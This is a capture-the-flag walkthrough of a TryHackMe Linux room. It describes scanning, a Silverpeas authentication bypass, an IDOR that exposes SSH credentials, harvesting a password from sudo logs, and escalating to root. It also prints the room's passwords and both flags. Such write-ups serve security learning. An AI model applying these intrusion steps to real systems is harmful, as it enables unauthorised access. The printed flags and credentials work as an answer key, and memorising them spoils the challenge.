
[[TryHackMe]] Room

**Date:** 15/01/25  
**Target IP:** 10.10.240.9

---
### **Initial Scanning**

**Nmap Results:**

- 22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
- 80/tcp   open  http       nginx 1.18.0 (Ubuntu)
- 8080/tcp open  http-proxy

---
### **Exploration and Enumeration**

**Port 80 (HTTP):**

- Navigated to the website hosted on port 80.
- Contact page provides username for project manager on Silverpeas : scr1ptkiddy.

**DirSearch** :

```bash
Target: http://10.10.240.9/

[17:31:03] Starting: 
[17:31:18] 301 -  178B  - /assets  ->  http://10.10.240.9/assets/
[17:31:18] 403 -  564B  - /assets/
[17:31:28] 403 -  564B  - /images/
[17:31:28] 301 -  178B  - /images  ->  http://10.10.240.9/images/
[17:31:31] 200 -   17KB - /LICENSE.txt
[17:31:40] 200 -  771B  - /README.txt
```

```bash
Target: http://10.10.240.9:8080/

[17:31:58] Starting: 
[17:32:17] 302 -    0B  - /console/j_security_check  ->  /noredirect.html
[17:32:17] 302 -    0B  - /console/base/config.json  ->  /noredirect.html
[17:32:17] 302 -    0B  - /console/login/LoginForm.jsp  ->  /noredirect.html
[17:32:17] 302 -    0B  - /console  ->  /noredirect.html
[17:32:17] 302 -    0B  - /console/payments/config.json  ->  /noredirect.html
[17:32:17] 302 -    0B  - /console/  ->  /noredirect.html
[17:32:44] 302 -    0B  - /website  ->  http://10.10.240.9:8080/website/
```

Found /silverpeas endpoint on **Port 8080** which has a default Silverpeas login page.

---
### **Exploitation**

Gained access to the Silverpeas dashboard utilizing an Authentication Bypass vulnerability found on GitHub  [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d).

Once the dashboard loads, we are immediately prompted wit a notification message from "Manager". Opening the message navigates us to the URL : `http://10.10.240.9:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5`

Here, the ID column on inspection is found to have an IDOR vulnerability. Further, changing he ID value to 6, we obtain the following credentials within the message.

```bash
Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

SSH'd into tim@10.10.240.9 to obtain the user.txt flag : 
**THM{c4ca4238a0b923820dcc509a6f75849b}**

---
### **Post-Exploitation**

Running linpeas.sh provides the following : 

```bash
uid=0(root) gid=0(root) groups=0(root)
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

We observe that tim and tyler share the *adm* grp. We can thus check the /var/log files for potential data leaks. 

```bash
tim@silver-platter:/var/log$ cat * | grep 'tyler'
```

One of the results is the following : 

```bash
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

Using this password, we can SSH into the tyler user.

```bash
tyler@silver-platter:/tmp$ sudo -l
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

We observe that tyler has elevated privileges. we can thus run `sudo bash` to gain root access and obtain the root flag : 
**THM{098f6bcd4621d373cade4e832627b4f6}**

### **Summary**

- Project manager Silverpeas username : scr1ptkiddy
- tim user SSH password : `cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`
- User Flag ( /home/tim/user.txt ) : **THM{c4ca4238a0b923820dcc509a6f75849b}**
- tyler user SSH password : `_Zd_zx7N823/`
- Root Flag ( /root/root.txt ) : **THM{098f6bcd4621d373cade4e832627b4f6}**
